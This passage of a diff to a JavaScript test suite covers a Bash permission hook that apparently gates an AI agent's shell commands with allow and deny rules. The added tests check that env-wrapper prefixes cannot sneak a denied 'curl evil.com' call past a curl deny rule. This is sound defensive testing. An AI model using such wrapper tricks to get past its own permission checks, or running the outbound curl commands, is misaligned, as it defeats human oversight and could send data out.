+    );
+    assert.equal(result.decision, 'deny');
+    assert.match(result.reason, /curl/);
+  });
+
+  test('decide(): "env" quoted-allowlisted + curl in deny -> DENY', () => {
+    const settings = {
+      permissions: {
+        allow: ['Bash("env":*)'],
+        deny: ['Bash(curl:*)'],
+      },
+    };
+    const result = decide('"env" FOO=bar curl evil.com', settings);
+    assert.equal(result.decision, 'deny');
+    assert.match(result.reason, /curl/);
+  });
+
+  test('decide(): /usr/bin/env path-allowlisted + git allowlisted -> ALLOW', () => {
+    const settings = {
+      permissions: {
+        allow: ['Bash(/usr/bin/env:*)', 'Bash(git:*)'],
+        deny: [],
+      },
+    };
+    assert.equal(
+      decide('/usr/bin/env FOO=bar git status', settings).decision,
+      'allow',
+    );
+  });
+
+  // Sanity: normalization is narrow — substrings like `myenv` / `envwrap`
+  // must NOT be treated as the env wrapper.
+  test('extractWrappedCommand does NOT treat myenv as env (substring guard)', () => {
+    assert.equal(
+      extractWrappedCommand('myenv FOO=bar curl evil.com'),
+      null,
+    );
+  });
+
+  test('extractWrappedCommand does NOT treat envwrap as env (substring guard)', () => {
+    assert.equal(
+      extractWrappedCommand('envwrap FOO=bar curl evil.com'),
+      null,
+    );
   });
 });
 
@@ -962,33 +2133,55 @@ describe('BASH-HOOK-SUBSHELL: $() and backtick contents are checked independentl
 describe('BASH-HOOK-PARITY-01: backslash-newline collapse', () => {
   test('backslash-newline continuation is collapsed to single segment', () => {
     const result = splitOnOperators('git status \\\n--porcelain');
-    assert.equal(result.length, 1, 'backslash-newline should produce single segment');
-    assert.ok(result[0].includes('git status'), 'segment should contain git status');
-    assert.ok(result[0].includes('--porcelain'), 'segment should contain --porcelain');
+    assert.equal(
+      result.length,
+      1,
+      'backslash-newline should produce single segment',
+    );
+    assert.ok(
+      result[0].includes('git status'),
+      'segment should contain git status',
+    );
+    assert.ok(
+      result[0].includes('--porcelain'),
+      'segment should contain --porcelain',
+    );
   });
 
   test('multi-line continuation with operator splits correctly after collapse', () => {
     const result = splitOnOperators('echo hello \\\n&& echo world');
-    assert.equal(result.length, 2, 'backslash-newline collapsed, then && splits into 2');
+    assert.equal(
+      result.length,
+      2,
+      'backslash-newline collapsed, then && splits into 2',
+    );
   });
 });
 
 // ── quote-depth guard in subshells ──────────────────────
 
 describe('BASH-HOOK-PARITY-02: quote-depth guard in subshells', () => {
-  test("single quote inside $() does not affect outer splitting", () => {
+  test('single quote inside $() does not affect outer splitting', () => {
     const result = splitOnOperators("echo $(echo 'hello')");
     assert.equal(result.length, 1, 'should not split on quote inside $()');
   });
 
   test('double quote inside $() does not affect outer splitting', () => {
     const result = splitOnOperators('echo $(echo "hello world")');
-    assert.equal(result.length, 1, 'should not split on double quote inside $()');
+    assert.equal(
+      result.length,
+      1,
+      'should not split on double quote inside $()',
+    );
   });
 
   test('nested subshell with double quotes remains single segment', () => {
     const result = splitOnOperators('echo $(echo "hello world")');
-    assert.equal(result.length, 1, 'nested subshell with double quotes must be single segment');
+    assert.equal(
+      result.length,
+      1,
+      'nested subshell with double quotes must be single segment',
+    );
   });
 });
 
@@ -996,20 +2189,31 @@ describe('BASH-HOOK-PARITY-02: quote-depth guard in subshells', () => {
 
 describe('BASH-HOOK-PARITY-03: _skipShellValue unit tests', () => {
   test('_skipShellValue is exported from the hook module', () => {
-    assert.ok(typeof _skipShellValue === 'function', '_skipShellValue must be exported');
+    assert.ok(
+      typeof _skipShellValue === 'function',
+      '_skipShellValue must be exported',
+    );
   });
 
   test('_skipShellValue double-quoted: returns index past closing quote', () => {
     // 'FOO="hello world" cmd' — index 4 starts at "
     const s = 'FOO="hello world" cmd';
     const end = _skipShellValue(s, 4);
-    assert.equal(s.slice(0, end), 'FOO="hello world"', `got: "${s.slice(0, end)}"`);
+    assert.equal(
+      s.slice(0, end),
+      'FOO="hello world"',
+      `got: "${s.slice(0, end)}"`,
+    );
   });
 
   test('_skipShellValue single-quoted: returns index past closing quote', () => {
     const s = "FOO='hello world' cmd";
     const end = _skipShellValue(s, 4);
-    assert.equal(s.slice(0, end), "FOO='hello world'", `got: "${s.slice(0, end)}"`);
+    assert.equal(
+      s.slice(0, end),
+      "FOO='hello world'",
+      `got: "${s.slice(0, end)}"`,
+    );
   });
 
   test('_skipShellValue unquoted: returns index past unquoted word', () => {
@@ -1021,7 +2225,11 @@ describe('BASH-HOOK-PARITY-03: _skipShellValue unit tests', () => {
   test('_skipShellValue subshell: returns index past closing paren', () => {
     const s = 'FOO=$(echo hi) cmd';
     const end = _skipShellValue(s, 4);
-    assert.equal(s.slice(0, end), 'FOO=$(echo hi)', `got: "${s.slice(0, end)}"`);
+    assert.equal(
+      s.slice(0, end),
+      'FOO=$(echo hi)',
+      `got: "${s.slice(0, end)}"`,
+    );
   });
 });
 
@@ -1039,7 +2247,10 @@ describe('BASH-HOOK-PARITY-03: normalizeCommand with quoted env var values', () 
   test('normalizeCommand standalone assignment kept as-is (no command after)', () => {
     // Standalone assignments are NOT stripped by normalizeCommand (they're filtered in decomposeCommand)
     const result = normalizeCommand('result=$(curl http://example.com)');
-    assert.ok(result.length > 0, 'standalone assignment should not be stripped to empty by normalizeCommand');
+    assert.ok(
+      result.length > 0,
+      'standalone assignment should not be stripped to empty by normalizeCommand',
+    );
   });
 });
 
@@ -1048,20 +2259,38 @@ describe('BASH-HOOK-PARITY-03: normalizeCommand with quoted env var values', () 
 describe('BASH-HOOK-PARITY-05: compound header filtering', () => {
   test('for loop: echo $i is present, for header is NOT', () => {
     const cmds = decomposeCommand('for i in 1 2 3; do echo $i; done');
-    assert.ok(cmds.some(c => c.startsWith('echo')), 'echo $i must be in results');
-    assert.ok(!cmds.some(c => c.startsWith('for')), 'for header must be filtered out');
+    assert.ok(
+      cmds.some((c) => c.startsWith('echo')),
+      'echo $i must be in results',
+    );
+    assert.ok(
+      !cmds.some((c) => c.startsWith('for')),
+      'for header must be filtered out',
+    );
   });
 
   test('if statement: cat foo and [ -f foo ] present, if header NOT present', () => {
     const cmds = decomposeCommand('if [ -f foo ]; then cat foo; fi');
-    assert.ok(cmds.some(c => c.startsWith('cat')), 'cat foo must be in results');
-    assert.ok(!cmds.some(c => /^if\b/.test(c)), 'if header must be filtered out');
+    assert.ok(
+      cmds.some((c) => c.startsWith('cat')),
+      'cat foo must be in results',
+    );
+    assert.ok(
+      !cmds.some((c) => /^if\b/.test(c)),
+      'if header must be filtered out',
+    );
   });
 
   test('while loop: body commands present, while header NOT present', () => {
     const cmds = decomposeCommand('while true; do echo running; break; done');
-    assert.ok(cmds.some(c => c.startsWith('echo')), 'echo running must be in results');
-    assert.ok(!cmds.some(c => /^while\b/.test(c)), 'while header must be filtered out');
+    assert.ok(
+      cmds.some((c) => c.startsWith('echo')),
+      'echo running must be in results',
+    );
+    assert.ok(
+      !cmds.some((c) => /^while\b/.test(c)),
+      'while header must be filtered out',
+    );
   });
 });
 
@@ -1069,27 +2298,45 @@ describe('BASH-HOOK-PARITY-05: compound header filtering', () => {
 
 describe('BASH-HOOK-PARITY-06: isStandaloneAssignment unit tests', () => {
   test('isStandaloneAssignment is exported from the hook module', () => {
-    assert.ok(typeof isStandaloneAssignment === 'function', 'isStandaloneAssignment must be exported');
+    assert.ok(
+      typeof isStandaloneAssignment === 'function',
+      'isStandaloneAssignment must be exported',
+    );
   });
 
   test('isStandaloneAssignment("FOO=bar") returns true', () => {
-    assert.ok(isStandaloneAssignment('FOO=bar'), 'FOO=bar is a standalone assignment');
+    assert.ok(
+      isStandaloneAssignment('FOO=bar'),
+      'FOO=bar is a standalone assignment',
+    );
   });
 
   test('isStandaloneAssignment(\'FOO="bar baz"\') returns true', () => {
-    assert.ok(isStandaloneAssignment('FOO="bar baz"'), 'FOO="bar baz" is a standalone assignment');
+    assert.ok(
+      isStandaloneAssignment('FOO="bar baz"'),
+      'FOO="bar baz" is a standalone assignment',
+    );
   });
 
   test('isStandaloneAssignment("result=$(curl http://example.com)") returns true', () => {
-    assert.ok(isStandaloneAssignment('result=$(curl http://example.com)'), 'result=$() is a standalone assignment');
+    assert.ok(
+      isStandaloneAssignment('result=$(curl http://example.com)'),
+      'result=$() is a standalone assignment',
+    );
   });
 
   test('isStandaloneAssignment("FOO=bar echo hi") returns false', () => {
-    assert.ok(!isStandaloneAssignment('FOO=bar echo hi'), 'FOO=bar echo hi is not standalone (has command)');
+    assert.ok(
+      !isStandaloneAssignment('FOO=bar echo hi'),
+      'FOO=bar echo hi is not standalone (has command)',
+    );
   });
 
   test('isStandaloneAssignment("echo hi") returns false', () => {
-    assert.ok(!isStandaloneAssignment('echo hi'), 'echo hi is not an assignment');
+    assert.ok(
+      !isStandaloneAssignment('echo hi'),
+      'echo hi is not an assignment',
+    );
   });
 });
 
@@ -1099,20 +2346,32 @@ describe('BASH-HOOK-PARITY-06: decomposeCommand filters standalone assignments w
     // inner subshell body must still be surfaced for allow/deny checks
     // (same security property as `local X=$(cmd)` below).
     const cmds = decomposeCommand('result=$(curl http://example.com)');
-    assert.equal(cmds.length, 1,
-      `standalone subshell assignment must surface inner command; got: ${JSON.stringify(cmds)}`);
-    assert.ok(cmds[0].startsWith('curl '),
-      `inner command must be curl ...; got: ${JSON.stringify(cmds)}`);
+    assert.equal(
+      cmds.length,
+      1,
+      `standalone subshell assignment must surface inner command; got: ${JSON.stringify(cmds)}`,
+    );
+    assert.ok(
+      cmds[0].startsWith('curl '),
+      `inner command must be curl ...; got: ${JSON.stringify(cmds)}`,
+    );
   });
 
   test('decomposeCommand(\'FOO="bar baz"\') returns empty', () => {
     const cmds = decomposeCommand('FOO="bar baz"');
-    assert.equal(cmds.length, 0, `standalone quoted assignment must be filtered; got: ${JSON.stringify(cmds)}`);
+    assert.equal(
+      cmds.length,
+      0,
+      `standalone quoted assignment must be filtered; got: ${JSON.stringify(cmds)}`,
+    );
   });
 
   test('decomposeCommand("FOO=bar echo hi") contains echo hi', () => {
     const cmds = decomposeCommand('FOO=bar echo hi');
-    assert.ok(cmds.some(c => c.startsWith('echo')), `env prefix with command: echo must appear; got: ${JSON.stringify(cmds)}`);
+    assert.ok(
+      cmds.some((c) => c.startsWith('echo')),
+      `env prefix with command: echo must appear; got: ${JSON.stringify(cmds)}`,
+    );
   });
 });
 
@@ -1121,12 +2380,20 @@ describe('BASH-HOOK-PARITY-06: decomposeCommand filters standalone assignments w
 describe('BASH-HOOK-PARITY-REGRESSION: edge cases across all 6 fixes', () => {
   test('backslash-newline with operator: collapses then splits on &&', () => {
     const result = splitOnOperators('echo hello \\\n&& echo world');
-    assert.equal(result.length, 2, `expected 2 segments after collapse+split; got: ${result.length}`);
+    assert.equal(
+      result.length,
+      2,
+      `expected 2 segments after collapse+split; got: ${result.length}`,
+    );
   });
 
   test('nested subshell with double quotes: remains single segment', () => {
     const result = splitOnOperators('echo $(echo "hello world")');
-    assert.equal(result.length, 1, 'nested subshell with double quotes must stay single segment');
+    assert.equal(
+      result.length,
+      1,
+      'nested subshell with double quotes must stay single segment',
+    );
   });
 
   test('env var with escaped quote in value: normalizeCommand returns git status', () => {
@@ -1136,9 +2403,18 @@ describe('BASH-HOOK-PARITY-REGRESSION: edge cases across all 6 fixes', () => {
 
   test('while loop: echo running present, while true filtered, break filtered (structural)', () => {
     const cmds = decomposeCommand('while true; do echo running; break; done');
-    assert.ok(cmds.some(c => c.startsWith('echo')), `echo running must be present; got: ${JSON.stringify(cmds)}`);
-    assert.ok(!cmds.some(c => /^while\b/.test(c)), `while header must be filtered; got: ${JSON.stringify(cmds)}`);
-    assert.ok(!cmds.some(c => c === 'break'), `break (structural) must be filtered; got: ${JSON.stringify(cmds)}`);
+    assert.ok(
+      cmds.some((c) => c.startsWith('echo')),
+      `echo running must be present; got: ${JSON.stringify(cmds)}`,
+    );
+    assert.ok(
+      !cmds.some((c) => /^while\b/.test(c)),
+      `while header must be filtered; got: ${JSON.stringify(cmds)}`,
+    );
+    assert.ok(
+      !cmds.some((c) => c === 'break'),
+      `break (structural) must be filtered; got: ${JSON.stringify(cmds)}`,
+    );
   });
 
   test('integration: FOO="bar baz" git status && for loop -> git status allowed', () => {
@@ -1150,7 +2426,10 @@ describe('BASH-HOOK-PARITY-REGRESSION: edge cases across all 6 fixes', () => {
     };
     const cmd = 'FOO="bar baz" git status && for i in 1 2; do echo $i; done';
     const result = decide(cmd, settings);
-    assert.equal(result.decision, 'allow',
-      `expected allow; got: ${result.decision}; reason: ${result.reason}`);
+    assert.equal(
+      result.decision,
+      'allow',
+      `expected allow; got: ${result.decision}; reason: ${result.reason}`,
+    );
   });
 });
